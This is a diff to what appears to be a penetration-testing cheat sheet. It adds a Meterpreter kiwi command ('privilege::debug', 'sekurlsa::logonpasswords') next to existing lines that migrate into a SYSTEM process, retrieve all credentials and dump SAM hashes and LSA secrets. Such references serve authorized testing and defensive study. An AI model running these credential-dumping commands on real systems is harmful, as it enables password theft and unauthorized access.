@@ -319,6 +319,7 @@ meterpreter> migrate some_process_nt_system_compatible
 meterpreter> creds_all    # retrieve all credentials
 meterpreter> lsa_dump_sam     # Admin  | Dump hashes from SAM
 meterpreter> lsa_dump_secrets # Admin? | Dump LSA secrets
+meterpreter> kiwi_cmd "privilege::debug"  "sekurlsa::logonpasswords" # Custom
 ```
 </div></div>
 
